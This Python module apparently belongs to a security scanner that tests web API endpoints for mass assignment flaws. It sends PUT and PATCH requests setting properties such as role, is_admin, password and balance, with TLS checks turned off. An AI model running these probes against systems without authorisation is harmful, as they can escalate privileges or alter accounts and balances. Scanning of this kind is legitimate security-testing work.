"""Mass Assignment Vulnerability Scanner — detect unprotected object properties."""

import aiohttp
import asyncio
import json
from urllib.parse import urljoin
from modules.core import console

MASS_ASSIGN_PROPS = {
    'privilege_escalation': [
        'role', 'admin', 'is_admin', 'isAdmin', 'is_superuser',
        'is_staff', 'privilege', 'permissions', 'access_level',
        'user_type', 'account_type', 'membership', 'tier',
    ],
    'account_takeover': [
        'email', 'password', 'username', 'verified', 'is_verified',
        'email_verified', 'active', 'is_active', 'confirmed',
        'two_factor', 'mfa_enabled', 'otp_secret',
    ],
    'financial': [
        'balance', 'credits', 'price', 'discount', 'amount',
        'total', 'fee', 'subscription', 'plan', 'billing',
    ],
    'internal': [
        'id', 'user_id', 'created_at', 'updated_at', 'deleted',
        'internal', 'debug', 'test', 'hidden', 'private',
        'api_key', 'token', 'secret',
    ],
}

TEST_ENDPOINTS = [
    '/api/user', '/api/users', '/api/account', '/api/profile',
    '/api/settings', '/api/preferences', '/api/update',
    '/api/v1/user', '/api/v1/users', '/api/v1/account',
    '/user/update', '/account/edit', '/profile/edit',
    '/settings', '/api/me', '/api/self',
]


async def _test_mass_assignment(session, url, endpoint):
    """Test a single endpoint for mass assignment."""
    findings = []
    test_url = urljoin(url, endpoint)

    try:
        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=8),
                               ssl=False) as resp:
            if resp.status not in [200, 201]:
                return findings
            try:
                original = await resp.json()
            except Exception:
                return findings
    except Exception:
        return findings

    for category, props in MASS_ASSIGN_PROPS.items():
        for prop in props:
            try:
                payload = {prop: True if 'is_' in prop or prop in ('admin', 'verified', 'active') else 'injected_value'}

                async with session.put(test_url, json=payload,
                                       timeout=aiohttp.ClientTimeout(total=8),
                                       ssl=False) as resp:
                    if resp.status in [200, 201, 204]:
                        try:
                            body = await resp.json()
                            if isinstance(body, dict):
                                if prop in body or prop in str(body):
                                    findings.append({
                                        'type': f'Mass Assignment ({category})',
                                        'endpoint': endpoint,
                                        'property': prop,
                                        'method': 'PUT',
                                        'severity': 'Critical' if category == 'privilege_escalation' else 'High',
                                    })
                        except Exception:
                            pass

                async with session.patch(test_url, json=payload,
                                         timeout=aiohttp.ClientTimeout(total=8),
                                         ssl=False) as resp:
                    if resp.status in [200, 201, 204]:
                        try:
                            body = await resp.json()
                            if isinstance(body, dict) and (prop in body or prop in str(body)):
                                findings.append({
                                    'type': f'Mass Assignment ({category})',
                                    'endpoint': endpoint,
                                    'property': prop,
                                    'method': 'PATCH',
                                    'severity': 'Critical' if category == 'privilege_escalation' else 'High',
                                })
                        except Exception:
                            pass
            except Exception:
                pass

    return findings


async def scan_mass_assignment(session, url):
    """Scan for mass assignment vulnerabilities."""
    console.print(f"\n[bold cyan]--- Mass Assignment Scanner ---[/bold cyan]")

    total_props = sum(len(p) for p in MASS_ASSIGN_PROPS.values())
    console.print(f"  [cyan]Testing {len(TEST_ENDPOINTS)} endpoints x {total_props} properties...[/cyan]")

    all_findings = []

    for endpoint in TEST_ENDPOINTS:
        findings = await _test_mass_assignment(session, url, endpoint)
        all_findings.extend(findings)
        for f in findings:
            console.print(f"  [bold red]{f['type']}: {f['endpoint']} → {f['property']}[/bold red]")
        await asyncio.sleep(0.1)

    if all_findings:
        console.print(f"\n  [bold red]{len(all_findings)} mass assignment vulnerabilities![/bold red]")
    else:
        console.print(f"\n  [green]No mass assignment vulnerabilities detected[/green]")

    return {'findings': all_findings}
